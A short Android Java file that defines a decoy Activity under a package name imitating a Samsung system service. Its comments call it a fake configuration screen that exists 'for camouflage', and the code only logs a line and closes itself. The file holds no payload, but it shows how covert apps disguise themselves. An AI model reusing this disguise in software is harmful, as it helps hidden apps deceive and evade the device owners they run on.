package com.samsung.android.service;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;

/**
 * Fake Configuration Activity
 * Never shown to user - exists for camouflage
 */
public class ConfigActivity extends Activity {
    private static final String TAG = "SystemCfg";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Do nothing - invisible activity
        Log.d(TAG, "Config activity created (invisible)");
        finish();
    }
}